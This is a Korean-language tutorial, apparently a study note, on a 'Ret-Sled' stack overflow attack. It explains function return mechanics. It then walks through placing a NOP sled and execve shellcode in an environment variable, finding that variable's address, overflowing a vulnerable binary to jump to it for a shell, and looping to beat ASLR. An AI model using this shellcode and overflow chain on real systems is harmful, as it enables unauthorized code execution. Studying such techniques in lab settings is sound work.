# ENV를 이용한 Ret-Sled 

환경변수를 이용한 Ret-Sled 공격에 대해 알아봅시다.

## Ret-Sled 란?

Return Address에 원하는 주소를 입력한 후 호출하여 콜 스택을 조작하는 것을 말한다.

먼저 간단히 함수가 Return 할 때 동작 방법을 알아보자.

---

## 함수 Return 방법

```
leave 내부 명령어

mov rsp, rbp
pop rbp

ret 내부 명령

pop rip
jmp rip
```

leave 명령으로 rbp가 이전 함수의 rbp로 복귀되고, 그 때 스택의 top은 Return Address를 가리키고 있다.

ret 명령으로 eip에 Return Address를 넣게 되고, eip로 jump 즉, Return Address로 jump하고 명령이 실행된다.

Ret-Sled는 이런 점을 이용하여 원하는 명령을 실행하게 만든다.

---

## ENV를 이용한 Ret-Sled 방법

### 1. 환경 변수 적용

```shell
$export SHELLCODE=`python -c 'print "\x90"*300+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`
```

이 주소로 return 해서 명령을 실행하면 `NOP`를 실행하면서 내려오다가 쉘 코드를 만나 쉘을 따게 되는 것이다.

### 2. 환경변수 주소 알아내기

``` c
#include<stdio.h>
#include<stdlib.h>

int main(void) {
    printf("%p\n",getenv("SHELLCODE"));
}
```

### 3. Return Address 전까지의 버퍼 크기 구하기

### 4. 입력

```shell
$(python -c 'print "a"*<크기>+"SHELLCODE 주소"'; cat) | ./bof(실행파일)
```
---

## 다른 Ret-Sled 방법

Return Address 다음에 NOP를 넣어 본 다음 입력된 NOP가 저장된 곳의 주소를 확인한다.

넣어 본 다음 그 다음 확인할 때 입력 받는 함수 뒤로 breakpoint를 걸어 rsp를 확인한다.

그 주소를 Return Address 부분에 입력하고 다음에 NOP와 Shello Code(\x30~)를 입력한다.

ASLR이 적용 안되어 있으면 가능하고, 적용 되어 있으면

```shell
$while [ 1 ]; do <명령어>; done; 을 돌린다.
```